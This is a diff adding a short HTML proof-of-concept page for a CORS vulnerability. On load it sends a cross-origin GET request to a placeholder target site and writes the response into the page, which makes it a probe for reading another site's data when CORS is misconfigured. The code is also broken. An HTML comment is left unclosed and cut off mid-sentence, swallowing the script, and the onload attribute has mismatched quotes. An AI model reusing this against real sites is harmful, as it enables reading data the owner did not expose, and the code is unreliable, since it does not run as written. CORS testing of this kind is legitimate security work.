@@ -1,0 +1,28 @@
+<html>
+<head>
+  <!-- Simple GET request to demonstrate CORS vulnerability. The 
+  <meta charset="UTF-8">
+  <script>
+
+    function makeRequest(method, resource) {
+        var url = "YOUR_SITE_HERE" + resource;
+        var xhttp = new XMLHttpRequest();
+
+        xhttp.onreadystatechange = function() {
+          if (xhttp.readyState == 4) {
+            if (xhttp.status == 200) {
+              document.write(xhttp.responseText);
+            } else {
+              document.write(xhttp.responseText);
+            }
+          }
+        }
+
+        xhttp.open(method, url);
+        xhttp.send();
+    }
+  </script>
+</head>
+<body onload="makeRequest("GET", "/")">
+</body>
+</html>
